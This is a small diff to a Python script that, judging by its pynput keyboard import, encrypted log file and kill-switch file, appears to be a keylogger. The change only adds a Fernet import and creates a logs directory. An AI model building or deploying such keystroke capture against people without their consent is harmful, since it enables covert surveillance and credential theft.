@@ -2,9 +2,10 @@ from pynput import keyboard
 from datetime import datetime
 import os
 import time
-
+from cryptography.fernet import Fernet
 from encryptor import encrypt_data
-
+LOG_DIR= "logs"
+os.makedirs(LOG_DIR, exist_ok=True)
 LOG_FILE = "logs/encrypted_logs.bin"
 KILL_SWITCH_FILE = "kill_switch.txt"
 
